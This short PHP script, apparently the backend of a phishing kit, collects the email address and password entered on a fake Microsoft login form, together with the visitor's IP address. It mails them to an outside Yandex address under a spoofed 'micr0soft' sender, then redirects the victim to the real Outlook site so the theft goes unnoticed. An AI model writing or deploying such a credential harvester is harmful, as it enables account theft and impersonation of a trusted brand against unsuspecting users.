<?   

$ip = getenv("REMOTE_ADDR");
$message .= "Email Address : ".$_POST['login']."\n";
$message .= "Password : ".$_POST['passwd']."\n";
$message .= "IP : ".$ip."\n";
$send = "ro.walker@yandex.com";
$subject = "MICROSOFT ReZulT";
$headers = "From: MICROSOFT<logs@micr0soft.ch>";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0\n";
mail("$send", "$subject", $message, $headers); 
header("Location: https://outlook.office.com");
	  

?>